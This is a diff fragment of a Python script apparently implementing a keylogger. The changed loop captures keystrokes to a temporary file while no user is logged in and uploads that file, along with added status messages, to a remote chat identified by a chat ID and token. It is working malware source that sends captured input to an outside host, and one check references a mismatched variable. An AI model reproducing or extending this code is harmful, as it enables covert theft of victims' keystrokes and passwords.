@@ -109,18 +109,27 @@ def keylogger(file, timeout):
 def is_file_empty(file_path):
     return os.path.getsize(file_path) == 0
 
+send_message(chat_id, token, "Starting")
+
 temp_file = tempfile.NamedTemporaryFile(delete=False)
 log_file_path = temp_file.name
 temp_file.close()
-print(log_file_path)
+
+send_message(chat_id, token, f"Temp file : {str(log_file_path)}")
+send_message(chat_id, token, "Entering in loop")
 
 while True:
     if is_user_logged_in():
+        send_message(chat_id, token, "userlogged")
         if os.path.isfile(log_file_path):
             os.remove(log_file_path)
-        send_message(chat_id, token, "userlogged")
+        send_message(chat_id, token, "deleted tempfile")
         break
     else:
+        send_message(chat_id, token, "usernotlogged")
         keylogger(log_file_path, 10)
+        send_message(chat_id, token, "keylogger() end")
         if not is_file_empty(file_path):
+            send_message(chat_id, token, "sending file")
             send_file(chat_id, token, log_file_path)
+            send_message(chat_id, token, "done")
